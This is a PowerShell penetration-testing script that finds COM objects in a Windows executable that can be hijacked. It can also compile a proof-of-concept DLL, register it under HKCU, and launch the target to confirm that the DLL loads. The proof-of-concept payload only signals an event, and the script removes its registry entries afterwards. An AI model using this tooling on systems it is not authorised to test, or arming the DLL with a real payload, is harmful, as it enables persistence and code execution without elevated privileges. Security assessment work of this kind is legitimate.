#Requires -Version 5.0
<#
.SYNOPSIS
    Detecta e explora vulnerabilidades de COM Hijacking em executáveis Windows.
.DESCRIPTION
    Extrai CLSIDs referenciados pelo binário e verifica quais estão registrados
    somente em HKLM — podendo ser interceptados via HKCU sem privilégio elevado.
    Com -GeneratePoC compila uma DLL maliciosa, registra no HKCU e valida execução.
    Com -RuntimeScan usa ETW para capturar ativações COM em tempo real (requer admin).
.PARAMETER ExePath
    Caminho do executável alvo.
.PARAMETER GeneratePoC
    Gera, compila e registra DLL maliciosa no HKCU para validar hijacking.
.PARAMETER RuntimeScan
    Executa o alvo e captura CLSIDs ativados via ETW (requer privilégio de admin).
.PARAMETER ScanSeconds
    Duração do runtime scan em segundos (padrão: 20).
.PARAMETER ClsidFilter
    Limita análise a um CLSID específico (útil para PoC direcionado).
.EXAMPLE
    .\Check-COMHijacking.ps1 -ExePath "C:\Program Files\App\app.exe"
    .\Check-COMHijacking.ps1 -ExePath "C:\Program Files\App\app.exe" -GeneratePoC
    .\Check-COMHijacking.ps1 -ExePath "C:\Program Files\App\app.exe" -RuntimeScan -ScanSeconds 30
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$ExePath,
    [switch]$GeneratePoC,
    [switch]$RuntimeScan,
    [int]$ScanSeconds = 20,
    [string]$ClsidFilter = ''
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Write-Status {
    param([string]$Prefix, [string]$Message)
    $color = switch ($Prefix) {
        '[+]' { 'Green'  } '[-]' { 'Red'    }
        '[!]' { 'Yellow' } '[*]' { 'Cyan'   }
        default { 'White' }
    }
    Write-Host "$Prefix $Message" -ForegroundColor $color
}

# Extract printable ASCII and Unicode strings from raw bytes
function Get-PEStrings {
    param([byte[]]$Bytes, [int]$MinLen = 6)
    $strings = [System.Collections.Generic.List[string]]::new()
    $sb = [System.Text.StringBuilder]::new()

    # ASCII pass
    foreach ($b in $Bytes) {
        if ($b -ge 0x20 -and $b -le 0x7E) {
            [void]$sb.Append([char]$b)
        } else {
            if ($sb.Length -ge $MinLen) { [void]$strings.Add($sb.ToString()) }
            [void]$sb.Clear()
        }
    }
    if ($sb.Length -ge $MinLen) { [void]$strings.Add($sb.ToString()) }
    [void]$sb.Clear()

    # Unicode pass (LE: printable char followed by 0x00)
    $i = 0
    while ($i -lt $Bytes.Length - 1) {
        if ($Bytes[$i] -ge 0x20 -and $Bytes[$i] -le 0x7E -and $Bytes[$i+1] -eq 0x00) {
            [void]$sb.Append([char]$Bytes[$i])
            $i += 2
        } else {
            if ($sb.Length -ge $MinLen) { [void]$strings.Add($sb.ToString()) }
            [void]$sb.Clear()
            $i++
        }
    }
    if ($sb.Length -ge $MinLen) { [void]$strings.Add($sb.ToString()) }

    return $strings | Select-Object -Unique
}

# Extract CLSIDs from string list using GUID regex pattern
function Get-CLSIDsFromStrings {
    param([string[]]$Strings)
    $guidPattern = '\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}'
    $found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
    foreach ($s in $Strings) {
        $matches = [regex]::Matches($s, $guidPattern)
        foreach ($m in $matches) { [void]$found.Add($m.Value.ToUpper()) }
    }
    return $found
}

# Check HKLM vs HKCU for a CLSID, return hijackability info
function Test-COMHijackable {
    param([string]$Clsid)

    $cleanGuid = $Clsid.Trim('{}').ToUpper()
    $fmtGuid   = "{$cleanGuid}"

    $hklmPaths = @(
        "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\$fmtGuid",
        "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\$fmtGuid"
    )
    $hkcuPaths = @(
        "Registry::HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\$fmtGuid"
    )

    $result = [PSCustomObject]@{
        CLSID          = $fmtGuid
        InHKLM         = $false
        InHKCU         = $false
        HKLMServer     = ''
        HKCUServer     = ''
        HKLMThreading  = ''
        Hijackable     = $false
        FriendlyName   = ''
        WOW64          = $false
    }

    # Check HKLM
    foreach ($p in $hklmPaths) {
        if (Test-Path $p) {
            $result.InHKLM = $true
            if ($p -match 'WOW6432') { $result.WOW64 = $true }
            # Get friendly name
            try {
                $nameVal = (Get-ItemProperty -Path $p -ErrorAction SilentlyContinue).'(default)'
                if ($nameVal) { $result.FriendlyName = $nameVal }
            } catch {}
            # Get InprocServer32
            $inprocPath = "$p\InprocServer32"
            if (Test-Path $inprocPath) {
                try {
                    $sv = (Get-ItemProperty -Path $inprocPath -ErrorAction SilentlyContinue).'(default)'
                    $tm = (Get-ItemProperty -Path $inprocPath -ErrorAction SilentlyContinue).'ThreadingModel'
                    if ($sv) { $result.HKLMServer = $sv }
                    if ($tm) { $result.HKLMThreading = $tm }
                } catch {}
            }
            break
        }
    }

    if (-not $result.InHKLM) { return $result }

    # Check HKCU (only if HKLM entry exists)
    foreach ($p in $hkcuPaths) {
        if (Test-Path $p) {
            $result.InHKCU = $true
            $inprocPath = "$p\InprocServer32"
            if (Test-Path $inprocPath) {
                try {
                    $sv = (Get-ItemProperty -Path $inprocPath -ErrorAction SilentlyContinue).'(default)'
                    if ($sv) { $result.HKCUServer = $sv }
                } catch {}
            }
            break
        }
    }

    # Hijackable = in HKLM, NOT in HKCU, and has InprocServer32 (DLL-hosted COM)
    $result.Hijackable = ($result.InHKLM -and -not $result.InHKCU -and $result.HKLMServer -ne '')
    return $result
}

# Detect C compiler
function Find-Compiler {
    # MSVC via vswhere
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $vsPath = & $vswhere -latest -property installationPath 2>$null
        if ($vsPath) {
            $vcvars = Get-ChildItem "$vsPath\VC\Auxiliary\Build" -Filter 'vcvars*.bat' -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($vcvars) { return @{ Type='MSVC'; VcvarsPath=$vcvars.FullName } }
        }
    }
    # MinGW / GCC
    foreach ($gcc in @('gcc','x86_64-w64-mingw32-gcc','i686-w64-mingw32-gcc')) {
        try { $out = & $gcc --version 2>$null; if ($out) { return @{ Type='GCC'; Exe=$gcc } } } catch {}
    }
    return $null
}

# Compile DLL with named event signal payload
function Invoke-CompileDLL {
    param([string]$OutPath, [string]$EventName, [string]$OrigDllPath, [hashtable]$Compiler)

    $exports = ''
    # If original DLL exists, add forwarder exports for compatibility
    if ($OrigDllPath -and (Test-Path $OrigDllPath)) {
        try {
            $expNames = & dumpbin /exports $OrigDllPath 2>$null |
                Where-Object { $_ -match '^\s+\d+\s+[0-9A-Fa-f]+\s+[0-9A-Fa-f]+\s+(\w+)' } |
                ForEach-Object { ($_ -split '\s+', 5)[4] } | Where-Object { $_ }
            $origName = [System.IO.Path]::GetFileNameWithoutExtension($OrigDllPath)
            foreach ($exp in $expNames) {
                $exports += "#pragma comment(linker, `"/export:$exp=$origName.$exp`")`n"
            }
        } catch {}
    }

    $src = @"
#include <windows.h>
$exports
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    (void)h; (void)r;
    if (reason == DLL_PROCESS_ATTACH) {
        HANDLE hEv = OpenEventA(EVENT_MODIFY_STATE, FALSE, "$EventName");
        if (hEv) { SetEvent(hEv); CloseHandle(hEv); }
    }
    return TRUE;
}
"@

    $srcFile = [System.IO.Path]::ChangeExtension($OutPath, '.c')
    [System.IO.File]::WriteAllText($srcFile, $src)

    try {
        if ($Compiler.Type -eq 'GCC') {
            $arch = if ($Compiler.Exe -match 'x86_64') { '' } else { '' }
            & $Compiler.Exe -shared -o $OutPath $srcFile -lkernel32 2>$null
        } else {
            $buildCmd = "`"$($Compiler.VcvarsPath)`" && cl /LD /nologo /Fe:`"$OutPath`" `"$srcFile`" kernel32.lib"
            cmd /c $buildCmd 2>$null
        }
        return (Test-Path $OutPath)
    } finally {
        Remove-Item $srcFile -ErrorAction SilentlyContinue
        Remove-Item ([System.IO.Path]::ChangeExtension($OutPath,'.obj')) -ErrorAction SilentlyContinue
        Remove-Item ([System.IO.Path]::ChangeExtension($OutPath,'.exp')) -ErrorAction SilentlyContinue
        Remove-Item ([System.IO.Path]::ChangeExtension($OutPath,'.lib')) -ErrorAction SilentlyContinue
    }
}

# Runtime ETW scan for COM activations (requires admin)
function Start-RuntimeScan {
    param([string]$ExePath, [int]$Seconds)

    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        Write-Status '[!]' 'Runtime scan requires admin privileges — skipping ETW capture'
        Write-Status '[!]' 'Run as Administrator to enable COM activation tracing'
        return @()
    }

    $sessionName = "comhijack_$PID"
    $etlFile     = "$env:TEMP\$sessionName.etl"
    $clsids      = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

    Write-Status '[*]' "Starting ETW session: $sessionName"
    try {
        # Microsoft-Windows-COM-Perf tracks CoCreateInstance calls
        & logman start $sessionName -p "Microsoft-Windows-COM-Perf" 0xFFFFFFFF 0xFF -o $etlFile -ets 2>$null | Out-Null

        Write-Status '[*]' "Launching target for ${Seconds}s..."
        $proc = Start-Process -FilePath $ExePath -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Seconds $Seconds
        if ($proc -and -not $proc.HasExited) { $proc.Kill() }

    } finally {
        & logman stop $sessionName -ets 2>$null | Out-Null
    }

    if (Test-Path $etlFile) {
        try {
            Get-WinEvent -Path $etlFile -Oldest -ErrorAction SilentlyContinue | ForEach-Object {
                $guidMatches = [regex]::Matches($_.Message, '\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}')
                foreach ($m in $guidMatches) { [void]$clsids.Add($m.Value.ToUpper()) }
            }
        } catch {
            Write-Status '[!]' "ETL parse warning: $($_.Exception.Message)"
        }
        Remove-Item $etlFile -ErrorAction SilentlyContinue
    }

    Write-Status '[+]' "Runtime captured $($clsids.Count) unique CLSID(s)"
    return $clsids
}

# ── Main ──────────────────────────────────────────────────────────────────────

if (-not (Test-Path $ExePath)) {
    Write-Status '[-]' "File not found: $ExePath"; exit 1
}

Write-Status '[*]' '=== COM HIJACKING ANALYSIS ==='
Write-Status '[*]' "Target: $ExePath"
Write-Host ''

# ── Step 1: Collect CLSIDs ────────────────────────────────────────────────────
Write-Status '[*]' 'Extracting CLSIDs from binary...'
$bytes   = [System.IO.File]::ReadAllBytes($ExePath)
$strings = Get-PEStrings -Bytes $bytes
$clsids  = Get-CLSIDsFromStrings -Strings $strings

if ($RuntimeScan) {
    Write-Status '[*]' "Runtime scan enabled (${ScanSeconds}s)..."
    $runtimeCLSIDs = Start-RuntimeScan -ExePath $ExePath -Seconds $ScanSeconds
    foreach ($c in $runtimeCLSIDs) { [void]$clsids.Add($c) }
}

if ($ClsidFilter -ne '') {
    $clsids = @($ClsidFilter.ToUpper())
}

Write-Status '[*]' "Total CLSIDs to check: $($clsids.Count)"
Write-Host ''

# ── Step 2: Registry check ────────────────────────────────────────────────────
Write-Status '[*]' 'Checking HKLM vs HKCU registration...'
Write-Host ''

$hijackable = [System.Collections.Generic.List[object]]::new()
$inHKLM     = [System.Collections.Generic.List[object]]::new()

foreach ($clsid in $clsids) {
    $info = Test-COMHijackable -Clsid $clsid
    if ($info.InHKLM) {
        $inHKLM.Add($info)
        if ($info.Hijackable) { $hijackable.Add($info) }
    }
}

Write-Status '[*]' "CLSIDs registered in HKLM : $($inHKLM.Count)"
Write-Status '[*]' "Hijackable (no HKCU entry): $($hijackable.Count)"
Write-Host ''

if ($hijackable.Count -eq 0) {
    Write-Status '[+]' 'No hijackable CLSIDs found (all have HKCU entries or no InprocServer32)'
    exit 0
}

# ── Step 3: Display results ───────────────────────────────────────────────────
Write-Status '[-]' '=== HIJACKABLE COM OBJECTS ==='
Write-Host ''
$i = 0
foreach ($h in $hijackable) {
    $i++
    Write-Host "  [$i] $($h.CLSID)" -ForegroundColor Red
    if ($h.FriendlyName) { Write-Host "      Name    : $($h.FriendlyName)" -ForegroundColor White }
    Write-Host "      HKLM DLL: $($h.HKLMServer)" -ForegroundColor Gray
    Write-Host "      Threading: $($h.HKLMThreading)" -ForegroundColor Gray
    if ($h.WOW64)        { Write-Host "      WOW64   : Yes (32-bit COM)" -ForegroundColor Yellow }
    Write-Host ''
}

# ── Step 4: PoC generation ────────────────────────────────────────────────────
if (-not $GeneratePoC) {
    Write-Status '[!]' 'Use -GeneratePoC to compile and validate a hijack PoC'
    exit 0
}

$compiler = Find-Compiler
if (-not $compiler) {
    Write-Status '[-]' 'No C compiler found (MSVC or GCC required for -GeneratePoC)'
    exit 1
}
Write-Status '[+]' "Compiler detected: $($compiler.Type)"
Write-Host ''

# Let user pick CLSID if multiple
$target = $hijackable[0]
if ($hijackable.Count -gt 1) {
    Write-Host 'Select CLSID to target:' -ForegroundColor Cyan
    $j = 0
    foreach ($h in $hijackable) {
        $j++
        $name = if ($h.FriendlyName) { " ($($h.FriendlyName))" } else { '' }
        Write-Host "  [$j]$name $($h.CLSID)" -ForegroundColor White
    }
    $sel = Read-Host "Choice [1-$($hijackable.Count)]"
    $idx = [int]$sel - 1
    if ($idx -ge 0 -and $idx -lt $hijackable.Count) { $target = $hijackable[$idx] }
}

$eventName  = "Global\PenPECOM_$([System.Guid]::NewGuid().ToString('N').Substring(0,8))"
$pocDir     = "$env:TEMP\com_poc_$PID"
$pocDllPath = "$pocDir\payload.dll"
[void](New-Item -ItemType Directory -Path $pocDir -Force)

Write-Status '[*]' "Target CLSID : $($target.CLSID)"
Write-Status '[*]' "Named event  : $eventName"
Write-Status '[*]' "PoC DLL path : $pocDllPath"
Write-Host ''

Write-Status '[*]' 'Compiling payload DLL...'
$compiled = Invoke-CompileDLL -OutPath $pocDllPath -EventName $eventName `
    -OrigDllPath $target.HKLMServer -Compiler $compiler

if (-not $compiled) {
    Write-Status '[-]' 'Compilation failed — check that compiler is properly configured'
    exit 1
}
Write-Status '[+]' "DLL compiled: $pocDllPath ($([Math]::Round((Get-Item $pocDllPath).Length/1KB,1)) KB)"

# Register in HKCU
$hkcuBase    = "HKCU:\SOFTWARE\Classes\CLSID\$($target.CLSID)"
$hkcuInproc  = "$hkcuBase\InprocServer32"

Write-Status '[*]' "Registering in HKCU: $hkcuInproc"
try {
    New-Item -Path $hkcuInproc -Force | Out-Null
    Set-ItemProperty -Path $hkcuInproc -Name '(default)' -Value $pocDllPath
    Set-ItemProperty -Path $hkcuInproc -Name 'ThreadingModel' -Value 'Both'
    Write-Status '[+]' 'Registry entry created'
} catch {
    Write-Status '[-]' "Registry write failed: $($_.Exception.Message)"
    exit 1
}

# Create named event and launch target
$hEvent = [System.Threading.EventWaitHandle]::new($false,
    [System.Threading.EventResetMode]::ManualReset, $eventName)

Write-Status '[*]' "Launching target: $ExePath"
$proc = Start-Process -FilePath $ExePath -PassThru -ErrorAction SilentlyContinue

$signaled = $hEvent.WaitOne(([System.TimeSpan]::FromSeconds($ScanSeconds)))
if ($proc -and -not $proc.HasExited) { $proc.Kill() }
$hEvent.Dispose()

Write-Host ''
if ($signaled) {
    Write-Status '[+]' "[CONFIRMED] COM Hijacking successful — named event signaled"
    Write-Status '[+]' "CLSID $($target.CLSID) loaded payload DLL from HKCU"
} else {
    Write-Status '[!]' "No signal within ${ScanSeconds}s — CLSID may not be activated at startup"
    Write-Status '[!]' "Try -InteractiveScan or trigger the COM-dependent feature manually"
}

# Cleanup
Write-Status '[*]' 'Cleaning up HKCU registry entries...'
try {
    Remove-Item -Path $hkcuBase -Recurse -Force -ErrorAction SilentlyContinue
    Write-Status '[+]' 'Registry entries removed'
} catch {
    Write-Status '[!]' "Cleanup warning: $($_.Exception.Message)"
    Write-Status '[!]' "Manual cleanup: Remove-Item -Path '$hkcuBase' -Recurse -Force"
}
Remove-Item $pocDir -Recurse -Force -ErrorAction SilentlyContinue
